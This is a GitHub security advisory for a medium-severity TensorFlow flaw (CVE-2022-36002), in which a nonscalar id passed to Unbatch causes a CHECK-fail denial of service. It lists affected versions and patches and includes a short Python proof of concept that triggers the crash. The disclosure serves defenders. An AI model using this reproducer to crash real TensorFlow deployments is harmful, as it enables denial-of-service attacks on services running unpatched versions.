# [M] TensorFlow vulnerable to `CHECK` fail in `Unbatch`

## Summary
Severity: Medium
Advisory: GHSA-mh3m-62v7-68xg
CVE: CVE-2022-36002
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-mh3m-62v7-68xg
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
When `Unbatch` receives a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack.
```python
import tensorflow as tf
import numpy as np
arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
arg_3=47
arg_4=''
arg_5=''
tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)
```

### Patches
We have patched the issue in GitHub commit [4419d10d576adefa36b0e0a9425d2569f7c0189f](https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mh3m-62v7-68xg
- https://nvd.nist.gov/vuln/detail/CVE-2022-36002
- https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
